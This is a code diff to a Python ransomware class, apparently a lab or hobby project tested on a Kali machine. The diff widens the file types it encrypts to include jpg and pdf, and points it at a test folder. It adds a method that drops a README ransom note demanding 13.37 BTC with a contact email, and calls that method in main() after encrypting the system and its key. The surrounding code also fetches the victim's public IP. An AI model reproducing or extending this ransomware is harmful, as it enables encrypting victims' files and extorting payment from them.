@@ -22,6 +22,8 @@ class RansomWare:
     # File exstensions to seek out and Encrypt
     file_exts = [
         'txt',
+        'jpg',
+        'pdf',
        # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
        # -and leaves other files un-ecnrypted etc.
        # 'png', 
@@ -45,7 +47,7 @@ class RansomWare:
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser('~')
         # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
-        self.localRoot = r'filepath' # Debugging/Testing
+        self.localRoot = r'/home/kali/Desktop/SuperImportantFolder/' # Debugging/Testing
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         self.publicIP = requests.get('https://api.ipify.org').text
@@ -160,6 +162,26 @@ class RansomWare:
                 pass
             time.sleep(10) # Debugging/Testing check for file on desktop ever 10 seconds
             print('Checking for PUT_ME_ON_DESKTOP.txt') # Debugging/Testing
+            
+            
+    # Creates a txt-file called README on the suggested filepath
+    # README.txt contains information to the victim
+    def ransom_note(self):
+        with open("filepath/README.txt", 'x') as f:
+            f.write(f'''Your system as been compromised by 3P1C H4X0R5.
+
+The files on your computer has been encrypted by an advanced encryption algorithm.
+If you want your files back then you have to pay us 13.37 BTC.
+
+Follow the steps below to get your files back:
+
+1.  Email us the file EMAIL_ME.txt to 3p1c_h4x0r5@protonmail.com
+    EMAIL_ME.txt should be located on your desktop.
+
+2.  Once we have responded to your mail and the ransom has been paid, a file with a key will be sent to you.
+    Place this file on your desktop and then we will decrypt your files.
+    ''')
+
 
 
 
@@ -169,6 +191,7 @@ def main():
     rw.crypt_system()
     rw.write_key()
     rw.encrypt_fernet_key()
+    rw.ransom_note()
     rw.what_is_bitcoin()
 
     t2 = threading.Thread(target=rw.put_me_on_desktop)
@@ -183,4 +206,3 @@ def main():
 
 if __name__ == '__main__':
     main()
- 
